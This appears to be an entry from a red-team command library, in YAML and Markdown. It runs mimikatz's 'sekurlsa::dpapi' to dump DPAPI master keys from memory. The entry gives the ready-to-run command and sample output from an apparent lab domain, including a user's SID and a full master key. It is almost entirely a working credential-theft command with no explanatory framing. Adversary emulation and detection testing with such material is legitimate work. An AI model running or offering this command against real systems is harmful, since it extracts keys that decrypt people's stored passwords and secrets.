---
id: f4e609bc-41da-44ef-8d30-9af7b550c191
name: Mimikatz Dump Masterkeys in Memory
type: command
executor: command_prompt
data: mimikatz.exe "sekurlsa::dpapi" "exit"
output: "C:\\Windows\\System32\\spool\\drivers\\color>mimikatz.exe \"sekurlsa::dpapi\"\
  \ \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59\n .##\
  \ ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi`\
  \ ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n\
  \ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'\
  \        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline)\
  \ # sekurlsa::dpapi\n\nAuthentication Id : 0 ; 1931875 (00000000:001d7a63)\nSession\
  \           : Interactive from 2\nUser Name         : bob\nDomain            : DEV\n\
  Logon Server      : DC-DEV\nLogon Time        : 7/20/2020 5:55:25 PM\nSID      \
  \         : S-1-5-21-1576920733-1301476157-954876328-1108\n         [00000000]\n\
  \         * GUID      :  {84dcc2cc-82c6-44d4-9404-45fd48b4b650}\n         * Time\
  \      :  7/20/2020 6:19:37 PM\n         * MasterKey :  daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723\n\
  \         * sha1(key) :  e49b3e446435a04d0396293e6dcae8df3274e323\n\n\nAuthentication\
  \ Id : 0 ; 1931844 (00000000:001d7a44)\nSession           : Interactive from 2\n\
  User Name         : bob\nDomain            : DEV\nLogon Server      : DC-DEV\nLogon\
  \ Time        : 7/20/2020 5:55:25 PM\nSID               : S-1-5-21-1576920733-1301476157-954876328-1108\n\
  ..."
created_at: '2020-07-21T05:09:20.612387+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Dump Masterkeys in Memory

```command_prompt
mimikatz.exe "sekurlsa::dpapi" "exit"
```

## Expected Output

```
C:\Windows\System32\spool\drivers\color>mimikatz.exe "sekurlsa::dpapi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # sekurlsa::dpapi

Authentication Id : 0 ; 1931875 (00000000:001d7a63)
Session           : Interactive from 2
User Name         : bob
Domain            : DEV
Logon Server      : DC-DEV
Logon Time        : 7/20/2020 5:55:25 PM
SID               : S-1-5-21-1576920733-1301476157-954876328-1108
         [00000000]
         * GUID      :  {84dcc2cc-82c6-44d4-9404-45fd48b4b650}
         * Time      :  7/20/2020 6:19:37 PM
         * MasterKey :  daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
         * sha1(key) :  e49b3e446435a04d0396293e6dcae8df3274e323


Authentication Id : 0 ; 1931844 (00000000:001d7a44)
Session           : Interactive from 2
User Name         : bob
Domain            : DEV
Logon Server      : DC-DEV
Logon Time        : 7/20/2020 5:55:25 PM
SID               : S-1-5-21-1576920733-1301476157-954876328-1108
...
```


